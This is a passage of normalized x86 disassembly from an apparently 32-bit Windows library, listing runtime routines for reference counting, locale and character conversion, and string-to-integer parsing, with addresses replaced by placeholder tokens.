retn 0xc
sub_10021b26
push 0x48
mov eax sub_100500b8
call sub_1002b2a6
mov eax [ ebp + 0x8 ]
mov [ eax ] r--data
mov ecx r--data
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] edx
and [ ebp - 0x4 ] 0x0
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] 0x0
mov [ ebp - 0x4 ] 0x1
test edx edx
jne r-xdata
call sub_1002b37e
retn 0x4
push r--data
lea ecx [ ebp - 0x2c ]
call sub_10001ebc
lea eax [ ebp - 0x2c ]
push eax
lea ecx [ ebp - 0x54 ]
mov [ ebp - 0x4 ] 0x2
call sub_10001eec
push r--data
lea eax [ ebp - 0x54 ]
push eax
call sub_1002ae74
sub_10021bab
push esi
mov esi ecx
push edi
lea ecx [ esi + 0xc ]
mov [ esi ] r--data
mov edi r--data
mov [ ecx ] edi
call sub_10016c58
lea ecx [ esi + 0x4 ]
mov [ ecx ] edi
pop edi
pop esi
jmp sub_10016c58
sub_10021bd0
push 0x28
mov eax sub_10050bb4
call sub_1002b2a6
push [ ebp + 0x8 ]
xor edi edi
push edi
push 0x3a
mov [ ebp - 0x10 ] edi
call [ OpenProcess@IAT ]
push r--data
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x10 ] eax
call sub_10001ebc
cmp [ ebp - 0x10 ] edi
lea eax [ ebp - 0x30 ]
push eax
sete al
movzx eax al
push eax
mov [ ebp - 0x4 ] edi
call sub_1001486a
or [ ebp - 0x4 ] 0xffffffff
pop ecx
pop ecx
push edi
push 0x1
lea ecx [ ebp - 0x30 ]
call sub_100020e2
push 0x14
call sub_1002738b
pop ecx
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] 0x1
cmp eax edi
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
push edi
lea ecx [ ebx + 0x4 ]
mov [ ebx ] edi
call sub_10021c67
push edi
push edi
push ebx
call sub_1000d3de
add esp 0xc
mov eax ebx
call sub_1002b37e
retn
mov edx [ ebp - 0x10 ]
push eax
call sub_10021b26
mov edi eax
sub_10021c67
push 0x4
mov eax sub_1004f989
call sub_1002b2d9
mov esi ecx
and [ esi ] 0x0
and [ ebp - 0x4 ] 0x0
push 0x10
call sub_1002738b
pop ecx
test eax eax
je r-xdata
xor eax eax
xor ecx ecx
inc ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov [ eax + 0xc ] ecx
jmp r-xdata
mov [ esi ] eax
mov eax esi
call sub_1002b37e
retn 0x4
sub_10021cc4
push 0x44
mov eax sub_100502d2
call sub_1002b2a6
push r--data
lea ecx [ ebp - 0x28 ]
call sub_10001ebc
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
lea ecx [ ebp - 0x50 ]
call sub_10001d30
push r--data
lea eax [ ebp - 0x50 ]
push eax
call sub_1002ae74
int3
sub_10021cfc
push 0x44
mov eax sub_100502d2
call sub_1002b2a6
push r--data
lea ecx [ ebp - 0x28 ]
call sub_10001ebc
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
lea ecx [ ebp - 0x50 ]
call sub_1000a72f
push r--data
lea eax [ ebp - 0x50 ]
push eax
call sub_1002ae74
int3
sub_10021d39
mov edi edi
push esi
push 0x18
mov esi ecx
call sub_1002738b
push eax
mov [ esi ] eax
call sub_10022fcc
pop ecx
pop ecx
mov eax esi
pop esi
retn
sub_10021d7c
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
mov esi [ edi + 0x20 ]
jmp r-xdata
test esi esi
jne r-xdata
push [ esi + 0x4 ]
push edi
push [ ebp + 0x8 ]
call [ esi + 0x8 ]
mov esi [ esi ]
add esp 0xc
pop edi
pop esi
pop ebp
retn 0x4
sub_10021da3
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
push 0x0
mov ecx esi
call sub_10021d7c
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
mov eax [ esi + 0x20 ]
and [ esi + 0x1c ] 0x0
test eax eax
je r-xdata
mov edi [ eax ]
push eax
call sub_100272e8
pop ecx
mov eax edi
test edi edi
jne r-xdata
and [ esi + 0x20 ] 0x0
pop edi
pop esi
pop ebp
retn
mov edi [ eax ]
push eax
call sub_100272e8
pop ecx
mov eax edi
test edi edi
jne r-xdata
sub_10021dee
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x4 ] 0x0
jbe r-xdata
push esi
call sub_10021da3
pop ecx
mov ecx [ esi + 0x24 ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x4 ]
dec [ eax + rw-data ]
mov eax [ esi + 0x4 ]
cmp [ eax + rw-data ] 0x0
jg r-xdata
pop esi
pop ebp
retn
push 0x1
call sub_100074b3
sub_10021e2a
mov edi edi
push edi
push rw-data
mov edi ecx
call [ InterlockedIncrement@IAT ]
test eax eax
jne r-xdata
mov eax edi
pop edi
retn
push esi
mov esi rw-data
push esi
call sub_10022fcc
add esi 0x18
cmp esi rw-data
pop ecx
jl r-xdata
pop esi
sub_10021e5b
push rw-data
call [ InterlockedDecrement@IAT ]
test eax eax
jge r-xdata
retn
push esi
mov esi rw-data
push esi
call sub_10022fdc
add esi 0x18
cmp esi rw-data
pop ecx
jl r-xdata
pop esi
sub_10021e84
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0x4
push esi
mov esi ecx
mov [ esi ] eax
jge r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
imul eax eax 0x18
add eax rw-data
push eax
call sub_10022fec
pop ecx
sub_10021ec3
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push [ eax ]
push [ eax + 0x4 ]
lea eax [ ebp + 0xc ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
push 0x1
push 0x0
call sub_1002c1ba
movsx ecx [ ebp + 0xc ]
add esp 0x1c
neg eax
sbb eax eax
and eax ecx
pop ebp
retn
sub_10021ef2
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
push [ eax ]
push [ eax + 0x4 ]
mov eax [ ebp + 0xc ]
push [ ebp + 0x10 ]
sub eax [ ebp + 0x8 ]
sar eax 0x1
push eax
push [ ebp + 0x8 ]
push 0x1
push 0x0
call sub_1002c1ba
mov eax [ ebp + 0xc ]
add esp 0x1c
pop ebp
retn
sub_10021f4e
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10021f39
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100272e8
pop ecx
sub_10021f6f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
test ecx ecx
je r-xdata
pop ebp
retn
call sub_10007d82
test eax eax
je r-xdata
mov edx [ eax ]
push 0x1
mov ecx eax
call [ edx ]
sub_10021f90
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x0
lea ecx [ ebp - 0x4 ]
call sub_10021e84
push rw-data
call sub_10021f6f
and [ rw-data ] 0x0
pop ecx
lea ecx [ ebp - 0x4 ]
call sub_10021eac
leave
retn
sub_10021fc2
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
push sub_10021f90
mov [ rw-data ] 0x1
call sub_1002300c
pop ecx
sub_10021fec
push 0x4
mov eax sub_1004e168
call sub_1002b2a6
push 0x0
lea ecx [ ebp - 0x10 ]
call sub_10021e84
mov edi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov esi [ edi + 0xc ]
jmp r-xdata
test esi esi
ja r-xdata
mov eax [ edi + 0x8 ]
dec esi
lea eax [ eax + esi * 4 ]
cmp [ eax ] 0x0
je r-xdata
push [ edi + 0x8 ]
call sub_10027a85
or [ ebp - 0x4 ] 0xffffffff
pop ecx
lea ecx [ ebp - 0x10 ]
call sub_10021eac
call sub_1002b37e
retn
mov ecx [ eax ]
call sub_10007d82
test eax eax
je r-xdata
mov edx [ eax ]
push 0x1
mov ecx eax
call [ edx ]
sub_1002204c
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x0
lea ecx [ ebp - 0x4 ]
call sub_10021e84
jmp r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov ecx eax
mov eax [ eax ]
push 0x1
mov [ rw-data ] eax
call sub_10021f4e
lea ecx [ ebp - 0x4 ]
call sub_10021eac
leave
retn
sub_10022081
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x8
call sub_1002738b
pop ecx
test eax eax
je r-xdata
push sub_1002204c
call sub_10021f1f
pop ecx
xor eax eax
mov ecx [ rw-data ]
mov [ eax ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
mov [ rw-data ] eax
pop ebp
retn
sub_100220bf
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x50 ] 0x0
jbe r-xdata
pop ebp
retn
cmp [ eax + 0x54 ] 0x10
jb r-xdata
add eax 0x40
mov eax [ eax + 0x40 ]
jmp r-xdata
push eax
push 0x0
call sub_1002d329
pop ecx
pop ecx
sub_100220e7
push 0x4
mov eax sub_1004ee15
call sub_1002b2a6
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi + 0x4 ] 0x1
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] eax
mov [ esi + 0x10 ] eax
mov al [ ebp + 0x8 ]
push r--data
lea ecx [ esi + 0x18 ]
mov [ esi ] r--data
mov [ esi + 0x14 ] al
call sub_10001ebc
mov eax esi
call sub_1002b37e
retn 0x4
sub_10022130
push 0x4
mov eax sub_1004e196
call sub_1002b2a6
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
push esi
mov [ ebp - 0x4 ] 0x1
call sub_10021fec
pop ecx
push 0x0
push 0x1
lea ecx [ esi + 0x18 ]
call sub_100020e2
mov [ esi ] r--data
call sub_1002b37e
retn
sub_1002216d
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10022130
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100272e8
pop ecx
sub_1002218e
push 0x8
mov eax sub_1004e1c3
call sub_1002b2a6
mov eax [ rw-data ]
mov esi eax
test eax eax
jne r-xdata
mov eax esi
call sub_1002b37e
retn
push eax
lea ecx [ ebp - 0x10 ]
call sub_10021e84
mov eax [ rw-data ]
and [ ebp - 0x4 ] esi
mov esi eax
test eax eax
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x10 ]
call sub_10021eac
push 0x34
call sub_1002738b
pop ecx
mov ecx eax
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x4 ] 0x1
test ecx ecx
je r-xdata
xor esi esi
push esi
call sub_100220e7
mov esi eax
jmp r-xdata
push esi
mov [ ebp - 0x4 ] 0x0
call sub_10021fc2
lea ecx [ esi + 0x18 ]
mov [ esi + 0x10 ] 0x3f
mov [ esp ] r--data
call sub_10001e9f
mov ecx esi
mov [ rw-data ] esi
call sub_10007d44
mov eax [ rw-data ]
mov [ rw-data ] eax
sub_10022228
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x0
call sub_1002d329
pop ecx
pop ecx
test eax eax
jne r-xdata
push esi
mov esi [ ebp + 0x8 ]
push eax
lea ecx [ esi + 0x3c ]
call sub_10001e9f
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax r--data
mov eax r--data
push [ ebp + 0xc ]
push 0x0
call sub_1002d329
pop ecx
pop ecx
test eax eax
jne r-xdata
push eax
lea ecx [ esi + 0x58 ]
call sub_10001e9f
pop esi
pop ebp
retn
sub_10022275
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x10
push esi
push edi
jb r-xdata
lea esi [ eax + 0x4 ]
mov esi [ eax + 0x4 ]
jmp r-xdata
mov edi [ ebp + 0x8 ]
push eax
lea ecx [ edi + 0x3c ]
call sub_10001e9f
test esi esi
je r-xdata
mov eax r--data
push 0x0
push 0x0
call sub_1002d329
pop ecx
pop ecx
test eax eax
jne r-xdata
mov eax r--data
push esi
push 0x0
call sub_1002d329
pop ecx
pop ecx
test eax eax
jne r-xdata
push eax
lea ecx [ edi + 0x58 ]
call sub_10001e9f
pop edi
pop esi
pop ebp
retn
sub_100222d1
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
push esi
push edi
test eax eax
jne r-xdata
mov esi [ eax ]
mov edi [ eax + 0x4 ]
call sub_1002d957
mov esi [ eax + 0x8 ]
call sub_1002d90b
mov edi eax
jmp r-xdata
and [ ebp + 0x14 ] 0x0
push edi
call sub_1002251d
pop ecx
lea ecx [ ebp + 0x14 ]
push ecx
push 0x0
push eax
call sub_1002d8ef
pop ecx
push eax
push [ ebp + 0x8 ]
lea eax [ ebp + 0xc ]
push 0x1
push eax
push 0x0
push edi
call [ WideCharToMultiByte@IAT ]
test eax eax
je r-xdata
mov ax [ ebp + 0xc ]
mov ecx 0xff
cmp ax cx
ja r-xdata
test esi esi
jne r-xdata
call sub_1002d4db
mov [ eax ] 0x2a
or eax 0xffffffff
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ecx ] al
xor eax eax
inc eax
jmp r-xdata
pop edi
pop esi
pop ebp
retn
sub_1002236e
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
mov eax [ esi ]
mov [ ebp - 0xc ] eax
mov eax [ esi + 0x4 ]
call sub_1002d957
mov eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
call sub_1002d90b
jmp r-xdata
push ebx
mov ebx [ ebp + 0x8 ]
push edi
mov edi 0x100
cmp ebx edi
jae r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x41 ]
cmp ecx 0x19
ja r-xdata
cmp [ ebp - 0xc ] 0x0
mov [ ebp - 0x10 ] eax
jne r-xdata
test esi esi
jne r-xdata
test esi esi
jne r-xdata
pop esi
leave
retn
add eax 0x20
jmp r-xdata
mov ecx [ esi + 0x8 ]
mov [ ebp - 0x8 ] ebx
sar [ ebp - 0x8 ] 0x8
mov eax [ ebp - 0x8 ]
and eax 0xff
movsx eax [ ecx + eax * 2 ]
shr eax 0xf
and eax 0x1
mov [ ebp - 0x8 ] ebx
sar [ ebp - 0x8 ] 0x8
call sub_1002dd87
movzx ecx [ ebp - 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8000
jmp r-xdata
mov eax [ esi + 0x8 ]
test [ eax + ebx * 2 ] 0x1
je r-xdata
push ebx
call sub_1002a9a0
pop ecx
test eax eax
jne r-xdata
xor eax eax
mov [ ebp + 0xc ] bl
mov [ ebp + 0xd ] 0x0
inc eax
mov al [ ebp - 0x8 ]
push 0x2
mov [ ebp + 0xc ] al
mov [ ebp + 0xd ] bl
mov [ ebp + 0xe ] 0x0
pop eax
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
jmp r-xdata
cmp eax 0x1
movzx eax [ ebp - 0x4 ]
je r-xdata
push 0x1
push [ ebp - 0x10 ]
lea ecx [ ebp - 0x4 ]
push 0x3
push ecx
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
push [ ebp - 0xc ]
push 0x0
call sub_1002dd42
add esp 0x24
test eax eax
jne r-xdata
pop edi
pop ebx
movzx ecx [ ebp - 0x3 ]
shl eax 0x8
or eax ecx
sub_1002247b
mov edi edi
push ebp
mov ebp esp
push esi
call sub_1002d957
mov eax [ eax + 0x4 ]
mov esi [ ebp + 0x8 ]
mov [ esi ] eax
call sub_1002d90b
push 0x2
push 0x100
mov [ esi + 0x4 ] eax
call sub_1002ddf5
pop ecx
pop ecx
mov [ esi + 0x8 ] eax
test eax eax
je r-xdata
call sub_1002dd87
and [ esi + 0xc ] 0x0
mov [ esi + 0x8 ] eax
push 0x200
call sub_1002dd87
push eax
push [ esi + 0x8 ]
call sub_1002a0f0
add esp 0xc
mov [ esi + 0xc ] 0x1
jmp r-xdata
mov eax esi
pop esi
pop ebp
retn
sub_100224db
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push 0xa
push 0x1f
lea eax [ ebp - 0x23 ]
push eax
push 0x0
push [ ebp + 0x8 ]
mov [ ebp - 0x24 ] 0x2e
call sub_1002e0e0
lea eax [ ebp - 0x24 ]
push eax
push 0x0
call sub_1002d234
mov ecx [ ebp - 0x4 ]
xor ecx ebp
add esp 0x1c
call sub_10027150
leave
retn
sub_1002251d
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
push 0x3e
xor edx edx
pop ecx
div ecx
xor esi esi
lea eax [ edx * 4 + rw-data ]
mov [ ebp - 0x4 ] eax
test esi esi
jne r-xdata
mov eax [ ebx + 0x4 ]
cmp eax [ ebp + 0x8 ]
je r-xdata
push edi
push esi
push [ ebp - 0x4 ]
mov [ esi ] edi
call [ InterlockedCompareExchange@IAT ]
cmp eax edi
jne r-xdata
push 0xc
call sub_1002ddb0
mov esi eax
pop ecx
test esi esi
je r-xdata
test esi esi
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
mov ebx edi
test edi edi
je r-xdata
mov eax [ esi + 0x8 ]
xor eax eax
jmp r-xdata
mov ebx [ ebp + 0x8 ]
push ebx
call sub_100224db
pop ecx
mov [ esi + 0x8 ] eax
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
jmp r-xdata
push [ esi + 0x8 ]
call sub_1002c6ce
push esi
call sub_10027a85
pop ecx
pop ecx
pop edi
pop esi
pop ebx
leave
retn
push esi
call sub_10027a85
pop ecx
mov [ esi + 0x4 ] ebx
sub_100225ba
push ebx
push esi
push edi
mov ebx rw-data
add ebx 0x4
cmp ebx rw-data
jl r-xdata
push [ esi + 0x8 ]
mov edi [ esi ]
call sub_1002c6ce
push esi
call sub_10027a85
pop ecx
pop ecx
mov esi edi
test edi edi
jne r-xdata
push 0x0
push ebx
call [ InterlockedExchange@IAT ]
mov esi eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_1002260b
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
test edi edi
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] 0x0
je r-xdata
cmp [ edi ] 0x0
jne r-xdata
mov eax [ ebp + 0x18 ]
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov esi [ eax ]
mov eax [ eax + 0x4 ]
call sub_1002d957
mov esi [ eax + 0x8 ]
call sub_1002d90b
jmp r-xdata
xor ecx ecx
mov [ eax ] cx
push [ ebp + 0xc ]
call sub_1002251d
mov esi [ ebp + 0x14 ]
cmp [ esi ] 0x0
pop ecx
mov ebx eax
je r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov [ ebp + 0xc ] eax
test esi esi
jne r-xdata
test ebx ebx
jne r-xdata
mov al [ edi ]
push ebx
mov [ esi + 0x1 ] al
call sub_1002d8ef
cmp eax 0x1
pop ecx
jle r-xdata
xor eax eax
inc eax
jmp r-xdata
movzx cx [ edi ]
mov [ eax ] cx
movzx eax [ edi ]
mov ecx [ ebx + 0x4 ]
movzx eax [ ecx + eax + 0x1d ]
and eax 0x4
call sub_1002dd87
movzx ecx [ edi ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8000
jmp r-xdata
and [ esi ] 0x0
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
push eax
push [ ebp + 0x8 ]
push 0x2
push esi
push 0x9
push [ ebp + 0xc ]
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
push eax
push [ ebp + 0x8 ]
push 0x1
push edi
push 0x9
push [ ebp + 0xc ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
push ebx
call sub_1002d8ef
pop ecx
cmp [ ebp + 0x10 ] eax
jae r-xdata
test eax eax
je r-xdata
and [ esi ] 0x0
jmp r-xdata
push ebx
call sub_1002d8ef
cmp eax 0x1
pop ecx
jle r-xdata
mov al [ edi ]
push 0xfffffffe
mov [ esi ] al
pop eax
jmp r-xdata
call sub_1002d4db
mov [ eax ] 0x2a
or eax 0xffffffff
jmp r-xdata
cmp [ edi + 0x1 ] 0x0
jne r-xdata
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
push eax
push [ ebp + 0x8 ]
push ebx
call sub_1002d8ef
pop ecx
push eax
push edi
push 0x9
push [ ebp + 0xc ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
push ebx
call sub_1002d8ef
pop ecx
jmp r-xdata
jmp r-xdata
sub_1002277f
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0x8 ]
movzx eax si
mov ecx 0xffff
mov [ ebp - 0x4 ] eax
cmp si cx
je r-xdata
pop esi
leave
retn
mov ecx [ ebp + 0xc ]
mov edx [ ecx ]
test edx edx
jne r-xdata
push [ ecx + 0x4 ]
lea eax [ ebp - 0x4 ]
push 0x1
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
push 0x200
push edx
push 0x0
call sub_1002e0ff
add esp 0x20
test eax eax
movzx eax [ ebp + 0x8 ]
je r-xdata
push edi
mov edi 0x100
cmp si di
pop edi
jae r-xdata
mov eax [ ebp - 0x4 ]
lea ecx [ esi - 0x61 ]
cmp cx 0x19
ja r-xdata
add esi 0xffffffe0
movzx eax si
jmp r-xdata
sub_100227ec
mov edi edi
push ebp
mov ebp esp
push ecx
push edi
mov edi [ ebp + 0x8 ]
movzx eax di
mov ecx 0xffff
mov [ ebp - 0x4 ] eax
cmp di cx
je r-xdata
pop edi
leave
retn
mov edx [ ebp + 0xc ]
push esi
mov esi [ edx ]
mov ecx 0x100
test esi esi
jne r-xdata
push [ edx + 0x4 ]
lea eax [ ebp - 0x4 ]
push 0x1
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
push ecx
push esi
push 0x0
call sub_1002e0ff
add esp 0x20
test eax eax
movzx eax [ ebp + 0x8 ]
je r-xdata
push ebx
mov ebx ecx
cmp di bx
pop ebx
jae r-xdata
pop esi
mov eax [ ebp - 0x4 ]
lea ecx [ edi - 0x41 ]
cmp cx 0x19
ja r-xdata
add edi 0x20
movzx eax di
jmp r-xdata
sub_10022859
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
sub esp 0x14
push ebx
xor ebx ebx
push esi
push edi
cmp eax ebx
je r-xdata
mov edi [ ebp + 0x8 ]
movzx eax [ edi ]
mov esi edi
jmp r-xdata
mov [ eax ] ebx
push eax
call sub_1002ab1d
pop ecx
test eax eax
jne r-xdata
inc esi
movzx eax [ esi ]
mov al [ esi ]
cmp al 0x2d
je r-xdata
mov [ ebp - 0x1 ] al
inc esi
cmp al 0x2b
je r-xdata
mov eax [ ebp + 0xc ]
cmp eax ebx
je r-xdata
cmp eax 0x1
je r-xdata
mov [ ebp - 0x1 ] 0x2b
jmp r-xdata
xor eax eax
mov [ eax ] edi
cmp eax 0x24
jg r-xdata
mov eax [ ebp + 0x10 ]
cmp eax ebx
jl r-xdata
cmp eax ebx
mov cl 0x30
jle r-xdata
cmp [ esi ] cl
je r-xdata
cmp eax 0x10
jne r-xdata
mov al [ esi + 0x1 ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x10 ] 0xa
jmp r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
cmp [ esi ] cl
jne r-xdata
mov [ ebp + 0x10 ] 0x10
cmp al 0x58
je r-xdata
cmp [ esi ] cl
je r-xdata
mov al [ esi + 0x1 ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x10 ] 0x8
jmp r-xdata
inc esi
movsx eax [ esi ]
push [ ebp + 0x10 ]
mov [ ebp - 0x8 ] ebx
push eax
mov [ ebp - 0x14 ] esi
mov [ ebp - 0xc ] ebx
call sub_1002e26b
pop ecx
push eax
mov edi r--data
push edi
call sub_10027b60
add esp 0xc
cmp eax ebx
je r-xdata
inc esi
inc esi
cmp al 0x58
jne r-xdata
mov bl [ ebp + 0x13 ]
mov ecx [ ebp - 0x8 ]
push [ ebp + 0x10 ]
mov bl al
mov eax edi
sub bl al
mov eax ecx
imul eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] ecx
movsx ecx bl
add eax ecx
mov [ ebp - 0x8 ] eax
inc esi
movsx eax [ esi ]
push eax
call sub_1002e26b
pop ecx
push eax
push edi
call sub_10027b60
add esp 0xc
test eax eax
jne r-xdata
jmp r-xdata
mov ecx [ ebp + 0x10 ]
movsx edx [ ecx + r--data ]
mov eax esi
sub eax edx
sub eax [ ebp - 0x14 ]
js r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
jmp r-xdata
cmp [ ebp - 0x1 ] 0x2d
jne r-xdata
test eax eax
jg r-xdata
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
jmp r-xdata
cmp [ ebp - 0x10 ] esi
jne r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
neg [ ebp - 0x8 ]
call sub_1002d4db
mov [ eax ] 0x22
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
movsx edx bl
sub eax edx
cmp [ ebp - 0x8 ] eax
jb r-xdata
mov eax [ ebp - 0x8 ]
jmp r-xdata
mov [ eax ] esi
or [ ebp - 0x8 ] 0xffffffff
mov [ ebp - 0x1 ] 0x2b
mov [ eax ] 0x1
xor edx edx
div ecx
cmp eax [ ebp - 0xc ]
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_100229f4
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
mov ebx [ ebp + 0x8 ]
movzx eax [ ebx ]
mov esi ebx
jmp r-xdata
lea edi [ ebp + 0x8 ]
push eax
call sub_1002ab1d
pop ecx
test eax eax
jne r-xdata
inc esi
movzx eax [ esi ]
mov al [ esi ]
cmp al 0x2d
je r-xdata
mov [ ebp + 0xf ] al
inc esi
cmp al 0x2b
je r-xdata
mov esi 0x7fffffff
cmp ebx [ edi ]
jne r-xdata
mov [ edi ] ebx
mov [ ebp + 0xf ] 0x2b
jmp r-xdata
cmp [ ebp + 0xf ] 0x2b
jne r-xdata
test eax eax
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push edi
push esi
call sub_10022859
add esp 0x10
cmp esi [ edi ]
jne r-xdata
cmp [ ebp + 0xf ] 0x2d
jne r-xdata
cmp eax esi
ja r-xdata
call sub_1002d4db
mov [ eax ] 0x22
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp eax 0x80000000
jbe r-xdata
xor eax eax
cmp [ ebp + 0xf ] 0x2d
sete al
add eax esi
jmp r-xdata
mov [ eax ] 0x1
neg eax
sub_10022a99
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
mov ebx [ ebp + 0x8 ]
movzx eax [ ebx ]
mov esi ebx
jmp r-xdata
lea edi [ ebp + 0x8 ]
push eax
call sub_1002ab1d
pop ecx
test eax eax
jne r-xdata
inc esi
movzx eax [ esi ]
mov al [ esi ]
cmp al 0x2d
je r-xdata
mov [ ebp + 0xf ] al
inc esi
cmp al 0x2b
je r-xdata
mov esi 0x80000000
cmp ebx [ edi ]
jne r-xdata
mov [ edi ] ebx
mov [ ebp + 0xf ] 0x2b
jmp r-xdata
cmp [ ebp + 0xf ] 0x2b
jne r-xdata
mov ecx eax
or ecx edx
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push edi
push esi
call sub_10022b5c
add esp 0x10
cmp esi [ edi ]
jne r-xdata
cmp [ ebp + 0xf ] 0x2d
jne r-xdata
cmp edx 0x7fffffff
ja r-xdata
call sub_1002d4db
mov [ eax ] 0x22
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp edx esi
jb r-xdata
jb r-xdata
cmp [ ebp + 0xf ] 0x2d
jne r-xdata
mov [ eax ] 0x1
neg eax
adc edx 0x0
neg edx
ja r-xdata
cmp eax 0xffffffff
ja r-xdata
or eax 0xffffffff
mov edx 0x7fffffff
jmp r-xdata
xor eax eax
mov edx esi
jmp r-xdata
test eax eax
jbe r-xdata
sub_10022b5c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
sub esp 0x28
push ebx
push esi
xor esi esi
push edi
cmp eax esi
je r-xdata
mov ebx [ ebp + 0x8 ]
movzx eax [ ebx ]
mov edi ebx
jmp r-xdata
mov [ eax ] esi
push eax
call sub_1002ab1d
pop ecx
test eax eax
jne r-xdata
inc edi
movzx eax [ edi ]
mov al [ edi ]
cmp al 0x2d
je r-xdata
mov [ ebp - 0x1 ] al
inc edi
cmp al 0x2b
je r-xdata
mov eax [ ebp + 0xc ]
cmp eax esi
